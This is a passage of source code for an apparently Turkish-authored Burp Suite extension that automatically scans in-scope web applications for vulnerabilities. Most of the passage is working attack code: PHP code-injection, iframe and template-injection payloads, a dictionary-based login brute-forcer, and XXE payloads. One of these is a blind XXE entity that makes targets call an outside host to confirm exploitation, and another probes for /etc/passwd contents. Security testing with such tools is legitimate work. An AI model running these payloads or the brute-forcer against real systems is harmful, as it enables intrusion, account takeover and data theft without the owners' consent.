		          "<? #print(int)0xFFF123-1;//?>",
		  "<? #print(int)0xFFF123-1;?>",
		  "<? print(int)0xFFF123-1;?>",
		  "<?php print(int)0xFFF123-1;?>",
		  "<?php #print(int)0xFFF123-1;?>",
		  "{php}#print(int)0xFFF123-1;{/php}",
		  "'{${#print(int)0xFFF123-1}}'",
		  "[php]#print(int)0xFFF123-1;[/php]",
		"#print 0xFFF123-1",
		"eval('#print 0xFFF123-1')",
		  "'+#print 0xFFF123-1+'",
		"\"+#print 0xFFF123-1+",
		"${@#print(0xFFF123-1);}"]

	postgetdict={}
	postgetdict=params.copy()

	for rcefull in rceler:
	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict={}
		    postgetdict[key]=value+rcefull
		    new_param = {}
		    new_param = postgetdict.copy()
		    try:
			if method=="GET":
			    y11 = session.get(url+"?"+postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if "167734101" in y11.text:
				self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)


			else:
			    y11 = session.post(url, postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if "167734101" in y11.text:
				self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)

		    except:
			mesaj="eee"
			#yaz(mesaj)
		    postgetdict.clear()
		    postgetdict = params.copy()

    def frameinjection(self,url,params,method):



	frameler = ["<iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>",
		            "\"><iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>",
		    "'<iframe src=https://github.com/antichown/0x94scanner/blob/master/README.md></iframe>'"]

	postgetdict={}
	postgetdict=params.copy()

	for framefull in frameler:
	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict={}
		    postgetdict[key]=value+framefull
		    new_param={}
		    new_param=postgetdict.copy()
		    try:

			if method=="GET":
			    y11 = session.get(url+"?"+postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if "README.md" in y11.text:
				if "README.md%3E%3C%2Fiframe%3E" not in y11.text:
				    self.ekle(method,url,"Frame Injection",str(new_param), rawdata)



			else:

			    y11 = session.post(url, postgetdict)

			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if "README.md" in y11.text:
				if "README.md%3E%3C%2Fiframe%3E" not in y11.text:
				    self.ekle(method,url,"Frame Injection",str(new_param), y11.text)


		    except:
			mesaj="Bilinmeyen hata olustu\n"
		    postgetdict.clear()
		    postgetdict = params.copy()

    def templateinjection(self,url,params,method):

	frameler = ["0x94{{17*17}}","{{17*17}}"]

	postgetdict={}
	postgetdict=params.copy()

	for framefull in frameler:
	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict={}
		    postgetdict[key]=value+framefull
		    new_param = {}
		    new_param = postgetdict.copy()
		    try:
			if method=="GET":
			    y11 = session.get(url+"?"+postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if value+"289" in y11.text.lower():
				self.ekle(method,url,"Template Injection",str(new_param), rawdata)



			else:
			    y11 = session.post(url, postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    if value+"289" in y11.text.lower():
				self.ekle(method,url,"Template Injection",str(new_param), rawdata)


			if value+"0x94289" in y11.text.lower():
			    self.ekle(method,url,"Template Injection",str(new_param), rawdata)


		    except:
			mesaj="Bilinmeyen hata olustu\n"

		    postgetdict.clear()
		    postgetdict = params.copy()


    def loginbrute(self, url, params, method):
	yakala = {}
	yakala = params.copy()
	loginnormal=""
	brutekaynak=""
	dictlogin = {}

	if yakala.has_key("user") or \
		   yakala.has_key("username") or \
	   yakala.has_key("userinput") or \
	   yakala.has_key("usr") or \
		yakala.has_key("uname") or \
		yakala.has_key("id") or \
		yakala.has_key("usernameinput") or \
		yakala.has_key("pass") or \
		yakala.has_key("passwd") or \
		yakala.has_key("password") or \
		yakala.has_key("passwdinput") or \
		yakala.has_key("passwordinput") or \
		yakala.has_key("uid") or \
		yakala.has_key("pwd"):

	    passlar=open("dict/pass.txt").readlines()
	    userlar=open("dict/user.txt").readlines()

	    dictb1 = {}
	    dictb1 = params.copy()
	    for key, value in params.items():

		try:
		    if key in dictb1:
			for x in passlar:
			    if key.lower() == "user" or \
			       key.lower() == "pass" or \
			       key.lower() == "username" or \
			       key.lower() == "password" or \
				    key.lower() == "passwd" or \
				    key.lower() == "userinput" or \
				    key.lower() == "uname" or \
				    key.lower() == "uid" or \
				    key.lower() == "id":
				dictb1[key] = "0x94"

		    parametrebrute1 = urllib.urlencode(dictb1)
		    if method == "GET":
			loginnormal = urlopen(url + "?" + parametrebrute1).read()

		    else:

			loginnormal = urlopen(url, parametrebrute1).read()

		    for gelenuser in userlar:
			dictlogin = {}
			dictlogin = params.copy()
			for gelenpass in passlar:
			    for key, value in params.items():
				if key in dictlogin:
				    if key.lower() == "user" or \
				       key.lower() == "usr" or \
				       key.lower() == "username" or \
				       key.lower() == "userinput" or \
					    key.lower() == "usernameinput" or \
					    key.lower() == "uname" or \
					    key.lower() == "id":
					dictlogin[key] = gelenuser.strip()

				    if key.lower() == "pass" or \
					key.lower() == "password" or \
				       key.lower() == "passwd" or \
				       key.lower() == "passinput" or \
					    key.lower() == "passwordinput" or \
					    key.lower() == "pwd":
					dictlogin[key] = gelenpass.strip()

			    loginsaf = urllib.urlencode(dictlogin)
			    if method == "GET":
				brutekaynak = urlopen(url + "?" + loginsaf).read()
				dictlogin.clear()
				dictlogin = params.copy()

			    else:
				brutekaynak = urlopen(url, loginsaf).read()
				dictlogin.clear()
				dictlogin = params.copy()
				
			    self.hatakontrol("Login Brute Error", url, brutekaynak, url)

			    if len(loginnormal) != len(brutekaynak):
				self.ekle("LOGIN", url, "Brute Force User:"+gelenuser.strip(), url + "\nLogin Data=" + loginsaf, brutekaynak)
		except:
		    mesaj = "ddd"
		    # yaz(mesaj)
		dictlogin.clear()
		dictlogin = params.copy()



    def xxe_error_injection(self, url, params, method,body):
	payload=["[{}]",'<?xml version="1.0" encoding="utf-8"?>','<?xml version="abc949999" ?><Doc/>']
	for pay in payload:
	    try:
		if method == "GET":
		    f = session.get(url + "?" + pay)
		    response = f.text

		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
		else:

		    f = session.post(url, pay)
		    response = f.text
		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
	    except:
		aa="err"

	    if "XMLMarshalException" in response or "UnmarshalException" in response or "SAPException" in response or "not supported, only XML" in response:
		self.ekle(method, url, "XML Injection Null Value", url + "DATA=" + pay, rawdata)



    def blind_xxe_injection(self, url, params, method,body):

	headerim = {"Content-Type": "application/xml"}


	rastgelekaptan = random.randint(0, 9999997)
	
	anahtar=randomString(19)
	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
	
	
	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>'

	for rakam in range(3):
	    if rakam==1:
		xmlraw=inject_key
	    else:
		xmlraw=inject_key+body
	    try:
		if method == "GET":
		    f = session.get(url + "?" + xmlraw)
		    response = f.text

		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
		else:

		    f = session.post(url, data=xmlraw,headers=headerim)
		    response = f.text
		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
		self.hatakontrol("POST", url, response, url)

		bakbak=requests.get("https://0x94.000webhostapp.com/0x94.txt").text
		if anahtar in bakbak:
		    self.ekle(method, url, "BLIND XXE Injection", url + "DATA" + inject_key+body, rawdata)

		self.hatakontrol("XXE", url, response, url)

	    except:
		mesaj = "fff"
		
		
    def xxe_injection(self, url, params, method,body):

	headerim = {"Content-Type": "application/xml"}


	rastgelekaptan = random.randint(0, 9999997)
	inject_key = '<?xml version="1.0"?>\n' + \
		    '<!DOCTYPE mmm [\n' + \
		'  <!ENTITY xxekey "' + str(rastgelekaptan) + '">\n' + \
	    ']>\n'+ \
		     '<user><username>&xxekey;</username><password>asd0x94</password></user>\n'
	
	
	for rakam in range(3):
	    if rakam==1:
		xmlraw=inject_key
	    else:
		xmlraw=inject_key+body
	    try:
		if method == "GET":
		    f = session.get(url + "?" + xmlraw)
		    response = f.text

		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
		else:

		    f = session.post(url, data=xmlraw,headers=headerim)
		    response = f.text
		    data = dump.dump_all(f)
		    rawdata = data.decode('utf-8')
		self.hatakontrol("POST", url, response, url)

		if "XPATH syntax error" in response or "XPathException" in response or \
				   "System.Xml.XPath.XPathException" in response or \
		   "Unknown error in XPath" in response or \
		   "org.apache.xpath.XPath" in response or \
			"Cannot convert expression to a number" in response or \
			"Empty Path Expression" in response or \
			"4005 Notes error: Query is not understandable" in response or \
			"root:x:0:0:root" in response or str(rastgelekaptan) in response:
		    self.ekle(method, url, "POST XXE Injection", url + "DATA" + inject_key+body, rawdata)

		self.hatakontrol("XXE", url, response, url)

	    except:
		mesaj = "fff"


    def randomString(stringLength):
	"""Generate a random string of fixed length """
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

    def scan_starter(self,url):

	try:

	    if "?" not in url:
		self.brute_file(url)

	    self.normalac(url)
	    self.sefurl_xss(url)
	    self.tumdizinlerde(url)
	    self.indexoful(url)
	    self.header_injection(url)

	    if "?" in url and "=" in url:
		self.sql(url)
		self.getrce(url)
		self.phpexec(url)
		self.lfitest(url)
		self.lfitara(url)
		self.headercrlf(url)
		self.getcommandinj(url)
		self.openredirect(url)
		self.timebased(url)
		self.timebasedvalue(url)
		self.blind(url)
		self.xsstest(url)
		self.getldapvexpath(url)
		self.ssrf_blind(url)

	except:
	    err="err"


    def tetikle(self,formurl,toplamveri,method,body):
	if method=="GET":

	    self.postget(formurl, toplamveri,"GET")
	    self.postgettek(formurl, toplamveri,"GET")
	    self.blindpostonay(formurl,toplamveri,"GET")
	    self.comandinj(formurl, toplamveri,"GET")
	    self.loginbrute(formurl,toplamveri,"GET")
	    self.postXSS(formurl, toplamveri,"GET")
	    self.ssikontrol(formurl, toplamveri,"GET")
	    self.blindcommand(formurl, toplamveri,"GET")
	    self.postrce(formurl, toplamveri,"GET")
	    self.frameinjection(formurl, toplamveri,"GET")
	    self.templateinjection(formurl, toplamveri,"GET")
	    self.ssrf_form(formurl, toplamveri,"GET")
	    self.xxe_injection(formurl, toplamveri,"GET",body)
	    self.xxe_error_injection(formurl, toplamveri,"GET",body)
	    self.blind_xxe_injection(formurl, toplamveri,"GET",body)

	else:

	    self.postget(formurl, toplamveri,"POST")
	    self.postgettek(formurl, toplamveri,"POST")
	    self.blindpostonay(formurl, toplamveri,"POST")
	    self.comandinj(formurl, toplamveri,"POST")
	    self.loginbrute(formurl,toplamveri,"POST")
	    self.postXSS(formurl, toplamveri,"POST")
	    self.ssikontrol(formurl, toplamveri,"POST")
	    self.blindcommand(formurl, toplamveri,"POST")
	    self.postrce(formurl, toplamveri,"POST")
	    self.frameinjection(formurl, toplamveri,"POST")
	    self.templateinjection(formurl, toplamveri,"POST")
	    self.ssrf_form(formurl, toplamveri,"POST")
	    self.xxe_injection(formurl, toplamveri,"POST",body)
	    self.xxe_error_injection(formurl, toplamveri,"POST",body)
	    self.blind_xxe_injection(formurl, toplamveri,"POST",body)

    def ekle(self,method,url,bug,payload,source):

	global analistem

	if not analistem.has_key(url+bug):
	    analistem["method"]=method
	    analistem["url"]=url
	    analistem["bug"]=bug
	    analistem["payload"]=payload
	    analistem["source"]=source
	    analistem[url+bug]="0x94"

	    java_URL = URL(url)

	    self.table_add(method,java_URL,bug,payload,source)



    def table_add(self,method,url,bug,payload,source):

	self._lock.acquire()
	row = self._log.size()
	self._log.add(LogEntry(method, url,bug,payload,source))
	self.fireTableRowsInserted(row, row)
	self._lock.release()




    def starter_xml(self,url,data):
	
	start_new_thread(self.xml_post_inj_response,(url,data,))
	
	

    def xml_request(self,url,data,degis):
	
	headerim = {"Content-Type": "application/xml",
	            "X-Requested-With":"XMLHttpRequest",
	            "Referer":url}

	
	try:
	    source = session.post(url, data,headers=headerim,verify=False)
	    if "0x94Scanner@washere" in source.text or \
	    "XMLMarshalException" in source.text or \
	    "UnmarshalException" in source.text or \
	    "SAPException" in source.text or\
	    "not supported, only XML" in source.text:
		
		self.ekle("POST", url, "XXE Injection Parameter="+degis, data, source.text)
	except:
	    error="xxx"
    
    
    
    def xml_inject_replace_error(self,xmldata, valuesi,url,anadata,degis):
	
	
	# xml_value=re.search("<"+degis+">(.*?)</"+degis+">",">0x94",data)
	eskidata = valuesi
	# yeni_data=xmldata.replace(valuesi,"0x94Scannere@washere")
	yeni_data = anadata.replace(eskidata, "&doksandortwashere")
	self.xml_request(url,anadata.replace(eskidata, "&doksandortwashere"),degis)
	# print "Eski="+valuesi
	#print "Yeni Data=" + yeni_data    
    
    def xml_inject_replace(self,xmldata, valuesi,url,anadata,degis):
	
	
	# xml_value=re.search("<"+degis+">(.*?)</"+degis+">",">0x94",data)
	eskidata = valuesi
	# yeni_data=xmldata.replace(valuesi,"0x94Scannere@washere")
	yeni_data = anadata.replace(eskidata, "0x94Scanner@washere")
	self.xml_request(url,anadata.replace(eskidata, "0x94Scanner@washere"),degis)
	# print "Eski="+valuesi
	#print "Yeni Data=" + yeni_data

    def xml_replace(self,parametre, data,url):
	
	
	degis = parametre.replace("/", "")
	# xml_value=re.search("<"+degis+">(.*?)</"+degis+">",">bekir",data)
	xml_value = re.search("<" + degis + ">(.*?)</" + degis + ">", data)
	if xml_value:
	    self.xml_inject_replace("<" + degis + ">" + xml_value.group(1) + "</" + degis + ">", xml_value.group(1),url,data,degis)
	    self.xml_inject_replace_error("<" + degis + ">" + xml_value.group(1) + "</" + degis + ">", xml_value.group(1),url,data,degis)
	    


    def xml_post_inj_response(self,url,data):
	

	bul_xml = re.findall("<(.*?)><(.*?)", data)
	for slashli in bul_xml:
	    if "/" in slashli[0]:
		# print slashli[0]
		self.xml_replace(slashli[0], data,url)	

    def form_starter(self,url,params,method,body):
	#threading.Thread(target = scan_starter, args = (self,url,)).start()
	
	start_new_thread(self.tetikle,(url,params,method,body,))


    def starter(self,url):
	
	#threading.Thread(target = scan_starter, args = (self,url,)).start()
	start_new_thread(self.scan_starter,(url,))


    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
	global taranan
	global session

	if self._callbacks.isInScope(self._helpers.analyzeRequest(messageInfo).getUrl()):
	
	    if toolFlag == 4 or toolFlag == 16 or toolFlag == 8:
    
    
		if messageIsRequest:
		    pass
		else:
    
    
		    resquest = messageInfo.getRequest()
		    analyzedRequest = self._helpers.analyzeRequest(resquest)
		    request_header = analyzedRequest.getHeaders()
    
		    response = messageInfo.getResponse()  # get Response from IHttpRequestResponse instance
		    analyzedResponse = self._helpers.analyzeResponse(response)
		    headerList = analyzedResponse.getHeaders()
    
		    method = analyzedRequest.getMethod()
			#dout.println(url.toString()+" - "+method)
		    parametredata = {}
		    url=self._helpers.analyzeRequest(messageInfo).getUrl()
		    
		    
		    for header in request_header:
			if header.startswith("Cookie: "):
			    splitHeader = header.split(":", 2)
			    headersm = {'Cookie': splitHeader[1].strip()}
			    session.headers.update(headersm)
			elif header.startswith("Referer: "):
			    splitHeader2 = header.split(":", 2)
			    headersm2 = {'Referer': splitHeader2[1].strip()}
			    session.headers.update(headersm2)
			elif header.startswith("User-Agent: "):
			    splitHeader3 = header.split(":", 2)
			    headersm3= {'User-Agent': splitHeader3[1].strip()}
			    session.headers.update(headersm3)	
			    
    
		    if method == "POST" :
			try:
    
			    httpService = messageInfo.getHttpService()
			    request = messageInfo.getRequest()
			    analyzedRequest = self._helpers.analyzeRequest(httpService, request)
			    body = request[analyzedRequest.getBodyOffset():].tostring()
    
    
			    for header in request_header:
				if "Content-Type" in header:
				    if "xml" in header or "urlencoded" in header:
					self.starter_xml(url.toString(),body)
				elif "Accept" in header:				    
				    if "*" in header or "xml" in header:
					self.starter_xml(url.toString(), body)
    
    
			    if body!="":
				if "&" in body:
				    body_split=body.split("&")
				    parametredata = {}
				    for param in body_split:
					plode=param.split("=")
					if plode[1]!="":
					    parametredata[plode[0]] = plode[1]
					else:
					    parametredata[plode[0]] = "0x94"
				else:
				    parametredata = {}
				    plode = body.split("=")
				    if plode[1] != "":
					parametredata[plode[0]]=plode[1]
				    else:
					parametredata[plode[0]]="0x94"
    
    
				#dout.println(url.toString() + " - " + method)
				#dout.println(body)
				#dout.println("------------------------------------------------------")
				#dout.println("geldi-form-data")
				self.form_starter(url.toString(),parametredata,method,body)
    
			except:
			    error="xxx"
			    
		    
		    
				#session.headers['Cookie'] = splitHeader[1]
				#session.headers.update({"Cookie":header.replace(header.split(':')[0]+":","")})
		    
				#self.table_add("XXX",url,"xx","xx","xxx")
		    
		    if not taranan.has_key(url):			
			taranan[url] = "0x94"
			self.starter(url.toString())			



	return

    def getRowCount(self):
	try:
	    return self._log.size()
	except:
	    return 0

    def getColumnCount(self):
	return 3

    def getColumnName(self, columnIndex):
	if columnIndex == 0:
	    return "Method"
	if columnIndex == 1:
	    return "URL"
	if columnIndex == 2:
	    return "Status"
	return ""

    def getValueAt(self, rowIndex, columnIndex):
	logEntry = self._log.get(rowIndex)
	if columnIndex == 0:
	    return logEntry._method
	if columnIndex == 1:
	    return logEntry._url.toString()
	if columnIndex == 2:
	    return logEntry._statu
	return ""


    def getHttpService(self):
	return self._currentlyDisplayedItem.getHttpService()

    def getRequest(self):
	return self._currentlyDisplayedItem.getRequest()

    def getResponse(self):
	return self._currentlyDisplayedItem.getResponse()



class Table(JTable):

    def __init__(self, extender):
	self._extender = extender
	self.setModel(extender)
	return

    def changeSelection(self, row, col, toggle, extend):

	logEntry = self._extender._log.get(row)
	self._extender._requestViewer.setMessage(logEntry._payload, True)
	self._extender._responseViewer.setMessage(logEntry._response, False)
    # self._extender._currentlyDisplayedItem = logEntry._response
	JTable.changeSelection(self, row, col, toggle, extend)
	return


class LogEntry:

    def __init__(self, method, url,status,payload,response):
	decode=urllib.unquote(payload)
	self._method =method
	self._url = url
	self._statu=status
	self._payload=decode
	self._response=response
	return

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
	self._httpService = httpService
	self._url = url
	self._httpMessages = httpMessages
	self._name = name
	self._detail = detail
	self._severity = severity

    def getUrl(self):
	return self._url

    def getIssueName(self):
	return self._name

    def getIssueType(self):
	return 0

    def getSeverity(self):
	return self._severity

    def getConfidence(self):
	return "Certain"

    def getIssueBackground(self):
	pass

    def getRemediationBackground(self):
	pass

    def getIssueDetail(self):
	return self._detail

    def getRemediationDetail(self):
	pass

    def getHttpMessages(self):
	return self._httpMessages

    def getHttpService(self):
	return self._httpService



class sendRequestRepeater(ActionListener):
    def __init__(self, extender):
	self._extender = extender

    def actionPerformed(self, e):
	#print "COPY SELECTED URL HANDLER ******"

	rows = self._extender.logTable.getSelectedRows()
	for row in rows:

	    model_row = self._extender.logTable.convertRowIndexToModel(row)

	    request = self._extender._log.get(model_row)._requestResponse
	    url = self._extender._log.get(model_row)._url

	    host = request.getHttpService().getHost()
	    port = request.getHttpService().getPort()
	    proto = request.getHttpService().getProtocol()

	    secure = True if proto == 'https' else False

	    self._extender._callbacks.sendToRepeater(host, port, secure, request.getRequest(), None);

	return

